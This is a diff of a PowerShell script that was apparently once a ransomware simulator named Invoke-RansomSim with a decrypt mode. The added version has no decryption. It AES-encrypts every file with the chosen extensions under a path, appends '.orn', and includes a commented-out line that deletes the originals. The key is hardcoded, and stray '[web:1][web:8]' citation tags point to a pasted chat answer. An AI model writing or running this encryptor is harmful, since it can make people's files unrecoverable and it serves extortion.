@@ -1,71 +1,46 @@
-# Hardcoded passphrase stored as plaintext
-$passphrase = 'Orion_1234567890'
-$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($passphrase) | Select-Object -First 32
-$IVBytes  = [System.Text.Encoding]::UTF8.GetBytes($passphrase) | Select-Object -First 16
-$KeyBase64 = [Convert]::ToBase64String($KeyBytes)
-$IVBase64  = [Convert]::ToBase64String($IVBytes)
-
-# Main execution block - parses args from command line or $args
 param(
-    [Parameter(Position=0,Mandatory)]
+    [Parameter(Mandatory=$true)]
     [string]$Path,
     
-    [Parameter(Position=1,Mandatory)]
-    [string[]]$Extension,
+    [Parameter(Mandatory=$true)]
+    [string[]]$Extensions,
     
-    [switch]$Recurse,
-    
-    [switch]$Decrypt
+    [switch]$Recurse
 )
 
-function Invoke-RansomSim {
-    param($Path, $Extension, $Recurse, $Decrypt, $KeyBase64, $IVBase64)
-    
-    $keyBytes = [Convert]::FromBase64String($KeyBase64)
-    $ivBytes  = [Convert]::FromBase64String($IVBase64)
-    
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $keyBytes
-    $aes.IV  = $ivBytes
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    
-    if ($Decrypt) {
-        # Decrypt mode
-        $searchParams = @{ Path = $Path; File = $true; Filter = '*.enc' }
-        if ($Recurse) { $searchParams.Recurse = $true }
-        $files = Get-ChildItem @searchParams
+# Hardcoded key and IV - Purple1234567890 (32 chars for AES-256)
+$KeyString = "Purple1234567890Purple1234567890Purple1234567890Pu"
+$IVString = "Purple1234567890Purple"
+$Key = [System.Text.Encoding]::UTF8.GetBytes($KeyString.Substring(0,32))
+$IV = [System.Text.Encoding]::UTF8.GetBytes($IVString.Substring(0,16))
+
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $Key
+$aes.IV = $IV
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$encryptor = $aes.CreateEncryptor()
+
+# Find matching files
+$files = Get-ChildItem -Path $Path -Recurse:$Recurse -File | 
+         Where-Object { $Extensions -contains $_.Extension.TrimStart('.') }
+
+foreach ($file in $files) {
+    try {
+        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
+        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
         
-        foreach ($file in $files) {
-            $inPath = $file.FullName
-            $outPath = $inPath -replace '\.enc$',''
-            if (Test-Path $outPath) { continue }
-            
-            $cipherBytes = [System.IO.File]::ReadAllBytes($inPath)
-            $decryptor = $aes.CreateDecryptor()
-            $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
-            [System.IO.File]::WriteAllBytes($outPath, $plainBytes)
-            "Decrypted: $inPath -> $outPath"
-        }
-    } else {
-        # Encrypt mode
-        $searchParams = @{ Path = $Path; File = $true }
-        if ($Recurse) { $searchParams.Recurse = $true }
-        $files = Get-ChildItem @searchParams | Where-Object { $Extension -contains $_.Extension }
+        $encryptedPath = $file.FullName + ".orn"
+        [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedBytes)
         
-        foreach ($file in $files) {
-            $inPath = $file.FullName
-            $outPath = "$inPath.enc"
-            if (Test-Path $outPath) { continue }
-            
-            $plainBytes = [System.IO.File]::ReadAllBytes($inPath)
-            $encryptor = $aes.CreateEncryptor()
-            $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-            [System.IO.File]::WriteAllBytes($outPath, $cipherBytes)
-            "Encrypted: $inPath -> $outPath"
-        }
+        # Optionally delete original (uncomment if desired)
+        # Remove-Item $file.FullName -Force
+        
+        Write-Host "Encrypted: $($file.Name) -> $encryptedPath"
+    }
+    catch {
+        Write-Warning "Failed to encrypt $($file.Name): $_"
     }
 }
 
-# Execute with parsed parameters
-Invoke-RansomSim -Path $Path -Extension $Extension -Recurse:$Recurse -Decrypt:$Decrypt -KeyBase64 $KeyBase64 -IVBase64 $IVBase64
+$aes.Dispose()
+Write-Host "Encryption complete. Processed $($files.Count) files." [web:1][web:8]
